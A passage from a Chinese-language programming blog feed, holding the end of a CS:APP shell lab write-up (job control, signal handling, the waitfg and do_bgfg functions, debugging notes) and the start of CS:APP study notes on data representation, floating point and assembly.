<span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;command not found&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command 不是内置命令*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="waitfg（✔）"><a href="#waitfg（✔）" class="headerlink" title="waitfg（✔）"></a><strong>waitfg（✔）</strong></h3><p>等待前台作业结束，这个参考了书上的代码，也想了很久</p>
<p>书中建议使用sigsuspend函数进行阻塞，既能解决单独pause引来的竞争问题，又能解决sleep速度太慢的问题。<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913014756.png"></p>
<p>注意这个向量使用的是prev，该函数的实际作用是：1）将阻塞列表设为prev。2）在捕捉到一个信号之前，该进程被挂起（pause函数）。3）如果捕捉到一个信号而且从处理程序返回则sigsuspend返回，并且将该进程的阻塞列表恢复，如果是终止信号则该进程不从sigsuspend返回直接终止。<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913015040.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span><span class="comment">//linux shell在接收下一个命令之前，必须显示地等待前台作业终止</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">sigset_t</span> mask,prev;</span><br><span class="line">   sigemptyset(&amp;mask);</span><br><span class="line">   sigemptyset(&amp;prev);</span><br><span class="line">   <span class="comment">//等待前台作业传送来的SIGCHLD信号</span></span><br><span class="line">   <span class="keyword">while</span>(fgpid(jobs)!=<span class="number">0</span>)<span class="comment">//fgpid函数返回前台进程pid，如果没与前台进程则返回0</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="comment">//进来循环了，那就说明前台进程还在</span></span><br><span class="line">    sigsuspend(&amp;mask);<span class="comment">//清除阻塞列表，挂起，恢复阻塞列表</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//printf(&quot;暂无前台作业\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="do-bgfg（✔）"><a href="#do-bgfg（✔）" class="headerlink" title="do_bgfg（✔）"></a><strong>do_bgfg</strong>（✔）</h3><p>执行内置的bg函数和fg函数，在builtin_cmd函数中被调用，其参数时命令行参数列表。<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913193002.png"></p>
<p>在完成这个函数之前我们要认识一下fg命令和bg命令。</p>
<p>fg是foreground（前台）的缩写，用于将一个在后台的进程切换到前台，并恢复执行</p>
<ul>
<li><code>fg</code> 将最近放入后台的进程移动到前台执行</li>
<li><code>fg %jid</code> 根据jid进行操作</li>
<li><code>fg pid</code>根据pid进行操作</li>
</ul>
<p>bg是background（后台）的缩写，用于将一个暂停的程序放入后台执行。操作和fg相同。</p>
<p>下面在真正的shell演示一下：</p>
<p>先来一个<code>sleep 1000</code> 当前进程处于休眠状态，1000秒后返回控制，我们可以将其理解为一个运行中的程序。</p>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913194413.png"></p>
<p>CTRL+Z将其暂停</p>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913194627.png"></p>
<p>jobs查看作业列表</p>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913194739.png"></p>
<p>使用fg命令将其切换到前台并执行</p>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913194904.png"></p>
<p>然后CTRL+z将其暂停，使用bg命令让其在后台运行，jobs查看状态显示running</p>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913195034.png"></p>
<p>无论是fg还是bg都涉及到恢复一个stopped状态的进程，那么如何恢复一个进程？</p>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913224612.png"></p>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230913224440.png"></p>
<p>由此可知，我们在这个函数内要调用kill函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> <span class="comment">//argv是一个指向字符串指针的指针</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> jid,pid,ifpid,ifjid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">myjobs</span>;</span></span><br><span class="line">    <span class="type">sigset_t</span> mask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ifpid=<span class="built_in">sscanf</span>(argv[<span class="number">1</span>],<span class="string">&quot;%d&quot;</span>,&amp;pid);<span class="comment">//如果参数是pid则返回真</span></span><br><span class="line">    ifjid=<span class="built_in">sscanf</span>(argv[<span class="number">1</span>],<span class="string">&quot;%%%d&quot;</span>,&amp;jid);<span class="comment">//如果是jid则返回真</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span>(!ifpid&amp;&amp;!ifjid)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检查pid jid是否合规</span></span><br><span class="line">    <span class="keyword">if</span>(ifjid==<span class="number">0</span>)<span class="comment">//接收pid为参数</span></span><br><span class="line">    &#123;</span><br><span class="line">      jid=pid2jid(pid);</span><br><span class="line">      <span class="keyword">if</span>(jid==<span class="number">0</span>)<span class="comment">//pid不合法</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(%s):No such process\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  <span class="comment">//接收jid作为参数</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">if</span>(getjobjid(jobs,jid)==<span class="literal">NULL</span>)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;%s: No such job\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(jid==<span class="number">0</span>)<span class="comment">//接收pid为参数</span></span><br><span class="line">    &#123;</span><br><span class="line">      jid=pid2jid(pid);</span><br><span class="line">    &#125;</span><br><span class="line">    myjobs=getjobjid(jobs,jid);   </span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;fg&quot;</span>))</span><br><span class="line">    &#123;  <span class="comment">//fg的对象可能是bg也可能是st</span></span><br><span class="line">       <span class="keyword">if</span> (myjobs-&gt;state == ST)</span><br><span class="line">            kill(-(myjobs-&gt;pid), SIGCONT);</span><br><span class="line">        myjobs-&gt;state = FG;</span><br><span class="line">        sigprocmask(SIG_SETMASK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">        waitfg(myjobs-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123; <span class="comment">//bg命令</span></span><br><span class="line">      myjobs-&gt;state=BG;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, myjobs-&gt;jid, myjobs-&gt;pid, myjobs-&gt;cmdline);</span><br><span class="line">      kill(-(myjobs-&gt;jid),SIGCONT);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要注意的是使用kill的时候参数pid要设置为负数，设置为负数会将pid所在进程组的所有进程关闭。</p>
<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><p>这里讲一下检测的方法，在lab这个目录下运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make testxx     //出现的结果是我们编写的shell跑出的结果</span><br><span class="line"></span><br><span class="line">make rtestxx    //出现的是预期结果即正确的shell抛出的结果</span><br></pre></td></tr></table></figure>

<p>检查真的很有必要，在前面的函数是现阶段代码框架大致都有了，但是就像书中提到的涉及到linux信号处理的编程时十分棘手的，稍有不慎就会引发错误，而且有的错误藏得很深，可能运行几十次代码他都是正确的，但是有可能就是下一次，问题就出现了。一定要通过实验中提供的验证手段，逐个检查，遇到问题就去调试，或者用printf插入一些桩，我的方法是在容易出问题的地方（信号的阻塞与解除阻塞）打印出状态。</p>
<h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230914231829.png"></h3><p>按下CTRL+z之后，应该暂停前台进程并返回我们的shell，打印出“tsh&gt;”,但是<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230914231927.png"></p>
<p>可以看到进入了处理程序，并且暂停了前台程序。原来的函数是没有</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">getjobpid(jobs,pid)-&gt;state=ST;<span class="comment">//将前台作业标记为ST</span></span><br></pre></td></tr></table></figure>

<p>这条语句的，经过测试程序会卡死到恢复信号那个步骤，试想，当我们恢复信号，上面用kill指令对pid进程组的所有进程发送SIGTSTP信号，当我们的前台进程被停止的时候，内核会向父进程发送SIGCHLD信号,触发SIGCHLD。而这个程序被卡死在了SIGCHLD的处理程序中，说的更透彻一点，其实被卡在了<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230915020553.png"></p>
<p>waitpid这个函数里面，waitpid会挂起父进程（shell）等待子进程结束，而我们已经通过kill对子进程发送了SIGTSTP信号，子进程已经停止了，waitpid永远不会结束。这显然是SIGCHLD信号处理函数的漏洞，刚开始我错误的将SIGCHLD处理函数只用来处理终止的进程，没有考虑到停止的进程也会发送信号。所以我们要在SIGTSTP处理函数那里设置job的状态，是状态变为ST然后在SIGCHLD处理函数中增加条件判断</p>
<h2 id="知识盲点"><a href="#知识盲点" class="headerlink" title="知识盲点"></a>知识盲点</h2><ul>
<li><p>信号处理函数可以被其他信号处理程序中断<img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230917015600.png"></p>
</li>
<li><p>woc，看代码没看仔细，里面的Signal函数不是signal，而是对sigaction函数的封装。</p>
<p>Unix信号处理在不同的系统有不同的信号处理语义。</p>
<p>一些老的Unix系统在信号k被处理程序捕获之后就把对信号k的反应恢复到默认值（怪不得我看到有文章这样说，但实践了一下发现不是这样的），在这些系统上，每次运行之后，处理程序必须调用signal函数显示地重新设置自己，即在信号处理函数中使用signal重新设置。</p>
<p>像read、write这样的下系统调用潜在的会阻塞进程一段较长的时间，在一些比较早版本的unix系统中，当处理程序捕获到一个信号时，被中断的慢速系统调用在信号处理程序返回时不再继续，而是立即返回给用户一个错误条件，并将errno设置为EINTR，在这些系统上，程序员必须手动重启被中断的系统调用。</p>
<p>在这个lab中使用的使一个包装函数Signal，他调用了sigaction</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">handler_t</span> *<span class="title function_">Signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">handler_t</span> *handler)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">action</span>, <span class="title">old_action</span>;</span></span><br><span class="line"></span><br><span class="line">    action.sa_handler = handler;  </span><br><span class="line">    sigemptyset(&amp;action.sa_mask); <span class="comment">/* block sigs of type being handled 阻塞正在处理的信号类型 */</span></span><br><span class="line">    action.sa_flags = SA_RESTART; <span class="comment">/* restart syscalls if possible  如果可能，重新启动系统调用，即系统调用被中断后不需要手动恢复*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="number">0</span>)</span><br><span class="line">	unix_error(<span class="string">&quot;Signal error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (old_action.sa_handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>信号处理语义如下：</p>
<ul>
<li>只有这个处理程序当前正在处理的那种类型的信号被阻塞。</li>
<li>和所有信号实现一样，信号不会排队等待。</li>
<li>只要可能，被中断的系统调用会重新启动。</li>
<li>一旦设置信号处理程序，他就会一直保持。</li>
</ul>
<p>吐了原来那些信号处理函数是默认的。。。怎么说？因为当我们执行&#x2F;bin&#x2F;sleep命令时，其实是通过execve函数加载的新程序，execve加载之后信号处理函数恢复默认。</p>
</li>
</ul>
<p><img src="/2023/09/19/csapp-shlab/QQ%E6%88%AA%E5%9B%BE20230919171428.png"></p>
<p>全部的检测结果太长了，这里放一个比较复杂的代表了。</p>
]]></content>
      <tags>
        <tag>csapp</tag>
        <tag>lab</tag>
      </tags>
  </entry>
  <entry>
    <title>csapp笔记</title>
    <url>/2022/12/21/csapp/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一些自己的看法和心得。</p>
<h1 id="第一章-计算机系统漫游"><a href="#第一章-计算机系统漫游" class="headerlink" title="第一章 计算机系统漫游"></a>第一章 计算机系统漫游</h1><p>不知道是个人的原因，还是此章节比较特殊的原因，读了一遍，感觉没有进脑子什么东西。查看了一些笔记，说是有一定的C语言基础即可阅读，而第一章更是给读者们找自信的一个章节，这使我十分的迷茫。遇到困难我们就要勇敢的面对困难，硬着头皮整理一下吧。</p>
<span id="more"></span>

<h5 id="信息就是位-上下文"><a href="#信息就是位-上下文" class="headerlink" title="信息就是位+上下文"></a>信息就是位+上下文</h5><p>0和1组成位，也成为比特，八个位组成一组称为字节。系统之中所有的信息都是由一串比特表示的，区分不同数据对象的唯一方法就是对照上下文。举个简单的例子，0110 0100，这么一串比特，它既能表示二进制数，又能表示ASCII对应的值d，具体表示什么要联系上下文。</p>
<h5 id="了解编译系统如何工作的益处（书上这么写的不是我总结的）"><a href="#了解编译系统如何工作的益处（书上这么写的不是我总结的）" class="headerlink" title="了解编译系统如何工作的益处（书上这么写的不是我总结的）"></a>了解编译系统如何工作的益处（书上这么写的不是我总结的）</h5><p>1.优化程序性能</p>
<p>2.理解链接时出现的错误</p>
<p>3.避免安全漏洞</p>
<h5 id="了解shell"><a href="#了解shell" class="headerlink" title="了解shell"></a>了解shell</h5><p>第一章中不停的在提及shell。shell是一个命令解释器，他输出一个提示符，等待输入一个命令符，然后执行这个命令。简单的理解一下，Windows系统中我们打开一个程序需要点击其图像，Linux则需要我们输入命令行来打开，shell就是那个供用户输入命令行的程序。shell是一个应用程序，连接了用户和linux内核。参考：(<a href="http://c.biancheng.net/view/706.html">http://c.biancheng.net/view/706.html</a>)</p>
<h5 id="系统是硬件和软件互相交织的集合体（简单介绍一下硬件）"><a href="#系统是硬件和软件互相交织的集合体（简单介绍一下硬件）" class="headerlink" title="系统是硬件和软件互相交织的集合体（简单介绍一下硬件）"></a>系统是硬件和软件互相交织的集合体（简单介绍一下硬件）</h5><h6 id="1-总线"><a href="#1-总线" class="headerlink" title="1.总线"></a>1.总线</h6><p>像神经一样，贯穿于整个系统，携带信息字节并负责在各个部门传递</p>
<h6 id="2-I-x2F-O设备"><a href="#2-I-x2F-O设备" class="headerlink" title="2.I&#x2F;O设备"></a>2.I&#x2F;O设备</h6><p>及输入&#x2F;输出设备，键盘、鼠标为输入设备，显示器和磁盘为输出设备。</p>
<h6 id="3-主存"><a href="#3-主存" class="headerlink" title="3.主存"></a>3.主存</h6><p>主存是一个临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据。</p>
<h6 id="4-处理器"><a href="#4-处理器" class="headerlink" title="4.处理器"></a>4.处理器</h6><p>中央处理单元（CPU），简称处理器，世界是（或执行）存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（或寄存器），称为程序计数器（PC）。在任何时刻，PC都指向主存中的某条机器语言指令（即含有该指令的地址）。</p>
<h5 id="不大不小的疑惑"><a href="#不大不小的疑惑" class="headerlink" title="不大不小的疑惑"></a>不大不小的疑惑</h5><p>此时年轻懵懂的我不明白为什么有很多很多人念着Linux系统的好，Windows这种图形化控着与此相比有什么难以弥补的劣势？据说以后工作实践中，项目大多也是基于Linux完成的，有时间了一定好好了解一下其中的内幕。</p>
<h1 id="第二章-信息的表示和处理"><a href="#第二章-信息的表示和处理" class="headerlink" title="第二章 信息的表示和处理"></a>第二章 信息的表示和处理</h1><h6 id="研究数字的实际表示的意义"><a href="#研究数字的实际表示的意义" class="headerlink" title="研究数字的实际表示的意义"></a>研究数字的实际表示的意义</h6><p> 能够了解可以表时得知和不同算术运算的属性。从而使程序正确工作，更具可移植性，更安全。</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230224173354.png"></p>
<h6 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h6><p>大多数计算机使用8位的块（字节）作为最小的可寻址的内存单元。机器级的程序将内存视为一个非常大的字节数组，称为虚拟内存。内存的每个字节都由一个唯一的数字来标识，称为它的地址。所有可能地址的集合称为虚拟地址空间。</p>
<h6 id="十六进制表示法"><a href="#十六进制表示法" class="headerlink" title="十六进制表示法"></a>十六进制表示法</h6><p>二进制表示起来过用冗长，而十进制与二进制的转化很麻烦，十六进制表示起来很方便。如果二进制位数不是4的倍数，最左侧补0。</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230224174927.png"></p>
<p>j代表的是16进制0的数量。前面的i是1的数量，注意只能是1,11,111,1111这四种表示。</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230307203238.png"></p>
<h5 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h5><h6 id="字数据大小"><a href="#字数据大小" class="headerlink" title="字数据大小"></a>字数据大小</h6><p>字长决定虚拟地址空间的最大大小，我们常说的32位64位都是指的字长，32位字长虚拟地址空间为2的32次方及4GB。</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230307204456.png"></p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230307204729.png"></p>
<p>#include&lt;stdint.h&gt;中有关于int32_t等的宏定义，确定的大小可以避免很多麻烦，程序的可移植性也更高。</p>
<h6 id="寻址和字节顺序"><a href="#寻址和字节顺序" class="headerlink" title="寻址和字节顺序"></a>寻址和字节顺序</h6><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230307205643.png"></p>
<p>可以这样说，大端是更符合我们日常思维的那一种。两种端序没有优劣之分，选择哪种字节顺序没有技术上的理由。我们只需选择一种并且始终如一地坚持。</p>
<h6 id="C语言中的逻辑运算"><a href="#C语言中的逻辑运算" class="headerlink" title="C语言中的逻辑运算"></a>C语言中的逻辑运算</h6><p>逻辑运算和按位运算有很大的不同，其一逻辑运算中所有的非零参数都表示TRUE，0参表FALSE，其二，如果对第一个参数求值就能确定表达式的结果，那么逻辑运算就不会对第二个参数求值。</p>
<h6 id="C语言中的移位运算"><a href="#C语言中的移位运算" class="headerlink" title="C语言中的移位运算"></a>C语言中的移位运算</h6><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230307222226.png"></p>
<p>几乎所有的编译器都对有符号数使用算数右移（保留最高位），对于无符号数，右移必须是逻辑的。Java中x&gt;&gt;&gt;k是逻辑右移，x&gt;&gt;k是算数右移。</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230307223156.png"></p>
<h6 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h6><p>强制类型转换结果保持位不变，改变的是对位的解析方式</p>
<h6 id="有符号和无符号处理"><a href="#有符号和无符号处理" class="headerlink" title="有符号和无符号处理"></a>有符号和无符号处理</h6><p>当表达式中同时出现也有符号和无符号，那么C语言会隐式的将有符号数转换为无符号数（位不变），例如表达式-1&lt;0u返回的结果是0，也就是表达式错误，因为将-1的补码按照无符号数来解析。</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230324010451.png"></p>
<p>看着好像没什么问题，但是当len等于0，在运算0-1时，计算机会当作0+(-1),因为默认是有符号，而len是无符号的。所以(-1)要从补码转换成无符号数也就是T2U，也就是UMax，所以程序会进入死循环，并且访问到a的非法元素。</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230324012052.png"></p>
<p>A.当s比t短的时候会错误的返回1</p>
<p>B.两数相减得到负数会当作无符号数处理，最高位为1也就是一个很大的数大于零</p>
<p>C.改为return strlen(s)&gt;strlen(t)</p>
<h6 id="扩展一个数字的位表示"><a href="#扩展一个数字的位表示" class="headerlink" title="扩展一个数字的位表示"></a>扩展一个数字的位表示</h6><p>如果想扩展一个数字，只需要在它的最高位补上n个符号位，比如说101表示-3，在最左侧加1变为1101还是表示-3，我们可以看到它最高位与后一位的和-8+4&#x3D;-4这也是扩展前符号位的值，我们再给它扩展一位变为11101它还是表示-3，对于非负数我们只需在其前面补上0即可，正好今天在做datalab的howManyBits，和这个正好是相关的，刚开始看到网上师傅举得例子还有点懵，为啥101和1101代表的都是-3，所以我们可以知道有无数种形式的补码可以表示-3，而101是最短的一种。</p>
<h6 id="截断数字"><a href="#截断数字" class="headerlink" title="截断数字"></a>截断数字</h6><p>截断无符号数：</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230324001954.png"></p>
<h6 id="对于整数运算最后的思考-模运算"><a href="#对于整数运算最后的思考-模运算" class="headerlink" title="对于整数运算最后的思考 模运算"></a>对于整数运算最后的思考 模运算</h6><p>计算机执行整数运算实际上是一种模运算，什么是模运算呢？模运算也就是求余运算，在前面我们可以看到几乎所有的溢出都采取了模最高位取余数的方法。补码的表示，可以使正数加上负数的补码等于减去其原码比如</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span>-<span class="number">2</span></span><br><span class="line"><span class="symbol">0000 </span><span class="number">0011</span>-<span class="number">0000</span> <span class="number">0010</span>=  <span class="number">0000</span> <span class="number">0001</span></span><br><span class="line"><span class="symbol">0000 </span><span class="number">0011</span>+<span class="number">1111</span> <span class="number">1110</span>=<span class="number">1</span> <span class="number">0000</span> <span class="number">0001</span>//最高位舍去</span><br></pre></td></tr></table></figure>

<h5 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h5><h6 id="二进制小数"><a href="#二进制小数" class="headerlink" title="二进制小数"></a>二进制小数</h6><p>二进制小数，小数点左边是二的非负权（非负幂），小数点右边是二的负权，这一点和十进制小数并无区别。</p>
<p>二进制小数只能精确的表示形如（x*2的y次幂）的数</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230327091512.png"></p>
<h6 id="IEEE浮点数表示"><a href="#IEEE浮点数表示" class="headerlink" title="IEEE浮点数表示"></a>IEEE浮点数表示</h6><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230327091842.png"></p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230327092231.png"></p>
<p>正如书中提到的，浮点数看起来比较深奥难懂，但它是建立在小而一致的原则之上的。</p>
<p>根据exp的值，可以分为三种不同的情况，规格化的、非规格化的或特殊值</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230327093637.png"></p>
<h6 id="规格化得值"><a href="#规格化得值" class="headerlink" title="规格化得值"></a>规格化得值</h6><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230327093742.png"></p>
<p>小数点在f段最高位的左侧，隐含的以1开头表示。</p>
<h6 id="偏置值"><a href="#偏置值" class="headerlink" title="偏置值"></a>偏置值</h6><p>这个师傅讲的比较简单明了：</p>
<p>拿单精度来说，（规格化）e的取值范围是0000 0001<del>1111 1110也就是1</del>254，肯定不能只使用无符号表示，因为这样只能表示非负数，所以使用E&#x3D;e-Bias，其范围就是-126<del>127，那么为什么不直接用补码表示e呢？这样E的范围就是1111 1111</del>0111 1111&#x3D;（-128~127），可以看出使用偏置和使用补码表示的范围相差不大，还可以不用考虑符号</p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230327134820.png"></p>
<h6 id="非规格化的值"><a href="#非规格化的值" class="headerlink" title="非规格化的值"></a>非规格化的值</h6><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230327094556.png"></p>
<h6 id="特殊值"><a href="#特殊值" class="headerlink" title="特殊值"></a>特殊值</h6><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230327095039.png"></p>
<h6 id="舍入"><a href="#舍入" class="headerlink" title="舍入"></a>舍入</h6><p>浮点数浮点数采用向偶数最接近的偶数舍入的方法，这样对与那些处在中间的数在50%的时间里会向上舍入(1.5—&gt;2)，在另外的50%的时间会向下舍入(2.5—&gt;2)。</p>
<h6 id="浮点数运算"><a href="#浮点数运算" class="headerlink" title="浮点数运算"></a>浮点数运算</h6><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230327210735.png"></p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230327210747.png"></p>
<p>下面是对3丢失的解释，所以说浮点数计算不符合结合律</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">对于float</span> <span class="string">符号位</span> <span class="string">阶码</span> <span class="string">尾数分别为</span> <span class="number">1</span> <span class="number">8</span> <span class="number">23</span></span><br><span class="line"><span class="number">1e10</span> <span class="string">=</span> <span class="number">0010 </span><span class="number">0101 </span><span class="number">0100 </span><span class="number">0000 </span><span class="number">1011 </span><span class="number">1110 </span><span class="number">010</span><span class="string">（0</span> <span class="number">0000 </span><span class="number">0000</span><span class="string">）</span></span><br><span class="line">     <span class="string">=1.0</span> <span class="number">0101 </span><span class="number">0100 </span><span class="number">0000 </span><span class="number">1011 </span><span class="number">1110 </span><span class="number">0100 </span><span class="number">0000 </span><span class="number">0000 </span><span class="string">X</span> <span class="number">2</span><span class="string">^33</span></span><br><span class="line"><span class="string">表示成浮点数</span>   <span class="string">bias=127</span> <span class="string">所以E=127+33=160=1010</span> <span class="number">0000</span></span><br><span class="line"><span class="number">1e10</span></span><br><span class="line"><span class="string">浮点数：0</span> <span class="number">1010 </span><span class="number">0000 </span><span class="number">0010 </span><span class="number">1010 </span><span class="number">0000 </span><span class="number">0101 </span><span class="number">1111 </span><span class="number">0010</span> </span><br><span class="line"><span class="number">1e10</span><span class="string">+3=</span> <span class="number">0010 </span><span class="number">0101 </span><span class="number">0100 </span><span class="number">0000 </span><span class="number">1011 </span><span class="number">1110 </span><span class="number">010</span><span class="string">（0</span> <span class="number">0000 </span><span class="number">0011</span><span class="string">）</span></span><br><span class="line">      <span class="string">=1.0</span> <span class="number">0101 </span><span class="number">0100 </span><span class="number">0000 </span><span class="number">1011 </span><span class="number">1110 </span><span class="number">0100 </span><span class="number">0000 </span><span class="number">0011 </span><span class="string">X</span> <span class="number">2</span><span class="string">^33</span></span><br><span class="line"><span class="string">浮点数</span> <span class="string">=0</span> <span class="number">1010 </span><span class="number">0000 </span><span class="number">0010 </span><span class="number">1010 </span><span class="number">0000 </span><span class="number">0101 </span><span class="number">1111 </span><span class="number">0010</span></span><br><span class="line"><span class="string">可以看出后面括号里的的3=0</span> <span class="number">0000 </span><span class="number">0011</span><span class="string">直接被舍掉了</span></span><br></pre></td></tr></table></figure>

<h1 id="第三章-程序的机器级表示"><a href="#第三章-程序的机器级表示" class="headerlink" title="第三章  程序的机器级表示"></a>第三章  程序的机器级表示</h1><h2 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h2><p>从十六位过渡到64位不显得突兀，在指令后面加了字符后缀，确定大小<img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230405114357.png"></p>
<p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230405114424.png"></p>
<h2 id="访问信息"><a href="#访问信息" class="headerlink" title="访问信息"></a>访问信息</h2><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230405120704.png"></p>
<h2 id="ATT和Intel"><a href="#ATT和Intel" class="headerlink" title="ATT和Intel"></a>ATT和Intel</h2><p><img src="/2022/12/21/csapp/QQ%E6%88%AA%E5%9B%BE20230405122311.png"></p>
<p>之前接触的是intel的导致我以为这里出现了错误</p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>更新一点对栈的认知，之前一直以为将栈顶的值pop之后，内存中的值会消失，原来值会一直存在，直到被覆盖。</p>
